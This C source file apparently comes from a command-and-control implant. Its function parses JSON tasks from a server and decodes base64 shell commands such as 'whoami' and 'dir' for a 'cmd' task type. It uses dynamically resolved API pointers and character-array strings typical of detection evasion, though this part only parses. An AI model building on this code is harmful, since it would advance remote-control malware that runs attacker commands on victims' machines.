#include "../include/tokenizer.h"
#include "../include/std.h"
#include "../include/json.h"

/*
This function reads and parses a task in json format

Input:
    [in] PAPI api: a pointer to the API struct

    [in] CHAR* json: a pointer to a json string

    [out] [heap] CHAR** taskId: a pointer to receive the taskId member in json that needs to be freed

    [out] [heap] CHAR** taskType: a pointer to receive the taskType member in json that needs to be freed

    [out] [heap] CHAR** uuid: a pointer to receive the uuid member in json that needs to be freed

Output:
    Success -> CHAR*: a pointer to a base64 encoded string that holds the task value that `needs to be freed`

    Json doesn't hold any data -> NULL

Note:
    If the `task` member of json is empty (a.k.a. what to run is determined only by `taskType`) the return value is empty string that still `needs to be freed`
*/
Task readJsonTask(PAPI api, CHAR* json)
{
    /*
    general structure of a json request
    [
        [
            284,
            "d2hvYW1p",
            "cmd",
            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
        ],
        [
            285,
            "ZGly",
            "cmd",
            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
        ]
    ]
    */

    Task task = { NULL };

    CHAR* tmpJson = json;  // myStrtok modifies the string itself
    CHAR delim = { '\n' };
    // tokenize json
    Tokens tokensStruct = myStrtok(api, tmpJson, delim);

    // json is empty
    if (tokensStruct.tokenizedString[0] == '[' && tokensStruct.tokenizedString[1] == ']')
    {
        return task;
    }

    #ifdef DEBUG
    char hi[] = { 'N', 'u', 'm', 'b', 'e', 'r', 'O', 'f', 'T', 'o', 'k', 'e', 'n', 's', ':', ' ', '%', 'd', '\n', 0 };
    ((PRINTF)api->printf)(hi, tokensStruct.numberOfTokens);
    #endif

    CHAR* token;
    CHAR* trimmedToken1;
    CHAR* trimmedToken2;

    // start with the third line in the json because the first two are '['
    token = getToken(api, tokensStruct, 2);
    // remove spaces from the line
    trimmedToken1 = myTrim(api, token, ' ');
    // remove the comma
    task.taskId = myEndTrim(api, trimmedToken1, ',');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;

    CHAR* b64EncodedTaskParams;
    DWORD dwTaskSize;

    token = getToken(api, tokensStruct, 3);
    trimmedToken1 = myTrim(api, token, ' ');
    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
    // remove the double quotes
    b64EncodedTaskParams = myTrim(api, trimmedToken2, '"');

    // NOTE: task type is transferred in base64. We need to decode it

    // determine the size for the base64 decoded task type
    ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
            (LPCSTR)b64EncodedTaskParams,
            myStrlenA(b64EncodedTaskParams),
            CRYPT_STRING_BASE64,
            NULL,
            &dwTaskSize,
            NULL,
            NULL
    );

    task.taskParams = (CHAR*)((CALLOC)api->calloc)(dwTaskSize+1, sizeof(CHAR));

    // decode base64 encoded taskType
    ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
            (LPCSTR)b64EncodedTaskParams,
            myStrlenA(b64EncodedTaskParams),
            CRYPT_STRING_BASE64,
            (BYTE*)(task.taskParams),
            &dwTaskSize,
            NULL,
            NULL
    );

    #ifdef DEBUG
    if (task.taskParams == NULL)
    {
        char fail_c[] = { 'T', 'a', 's', 'k', 'N', 'U', 'L', 'L', '\n', 0 };
        ((PRINTF)api->printf)(fail_c);
    }
    char task_c[] = { 'T', 'a', 's', 'k', ':' , ' ', '%', 's', '\n', 0 };
    ((PRINTF)api->printf)(task_c, task.taskParams);
    char note_c[] = { 'N', 'o', 't', 'e', ':', ' ', '%', 's', '\n', 0 };
    char note_cr[] = { 'h', 'i', 0 };
    ((PRINTF)api->printf)(note_c, note_cr);
    #endif

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;
    ((FREE)api->free)(b64EncodedTaskParams);
    b64EncodedTaskParams = NULL;

    token = getToken(api, tokensStruct, 4);
    #ifdef DEBUG
    ((PRINTF)api->printf)(token);
    #endif
    trimmedToken1 = myTrim(api, token, ' ');
    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
    // remove the double quotes
    task.taskType = myTrim(api, trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    token = getToken(api, tokensStruct, 5);
    trimmedToken1 = myTrim(api, token, ' ');
    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
    // remove the double quotes
    task.agentUuid = myTrim(api, trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    return task;
}

